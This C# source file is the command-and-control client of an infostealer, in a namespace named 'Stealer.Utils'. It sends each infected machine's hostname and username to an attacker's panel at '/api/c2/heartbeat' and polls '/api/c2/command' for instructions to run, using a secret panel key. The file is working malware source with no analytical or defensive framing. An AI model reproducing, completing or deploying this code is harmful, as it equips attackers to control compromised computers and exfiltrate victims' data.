using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace Stealer.Utils
{
    public static class C2Client
    {
        private static readonly HttpClient _http = new HttpClient { Timeout = TimeSpan.FromSeconds(15) };

        private static string BaseUrl
        {
            get
            {
                Config.Initialize();
                string url = Config.PanelUrl.TrimEnd('/');
                int idx = url.LastIndexOf("/api/upload");
                if (idx > 0) url = url.Substring(0, idx);
                return url;
            }
        }

        public static async Task SendHeartbeat(string clientId)
        {
            var req = new HttpRequestMessage(HttpMethod.Post, BaseUrl + "/api/c2/heartbeat");
            req.Content = new StringContent(
                "{\"client_id\":\"" + Escape(clientId) + "\",\"hostname\":\"" + Escape(Environment.MachineName) + "\",\"username\":\"" + Escape(Environment.UserName) + "\"}",
                Encoding.UTF8, "application/json");

            if (!string.IsNullOrEmpty(Config.SecretKey))
                req.Headers.TryAddWithoutValidation("x-panel-key", Config.SecretKey);

            await _http.SendAsync(req);
        }

        public static async Task<string> PollCommand(string clientId)
        {
            var req = new HttpRequestMessage(HttpMethod.Get, BaseUrl + "/api/c2/command?client_id=" + Uri.EscapeDataString(clientId));

            if (!string.IsNullOrEmpty(Config.SecretKey))
                req.Headers.TryAddWithoutValidation("x-panel-key", Config.SecretKey);

            var resp = await _http.SendAsync(req);
            if (resp.StatusCode != HttpStatusCode.OK) return null;

            string body = await resp.Content.ReadAsStringAsync();
            string cmd = ParseJsonKey(body, "command");
            return cmd;
        }

        private static string Escape(string s)
        {
            return s.Replace("\\", "\\\\").Replace("\"", "\\\"");
        }

        private static string ParseJsonKey(string json, string key)
        {
            string search = "\"" + key + "\":\"";
            int start = json.IndexOf(search);
            if (start < 0) return null;
            start += search.Length;
            int end = json.IndexOf("\"", start);
            if (end <= start) return null;
            return json.Substring(start, end - start);
        }
    }
}
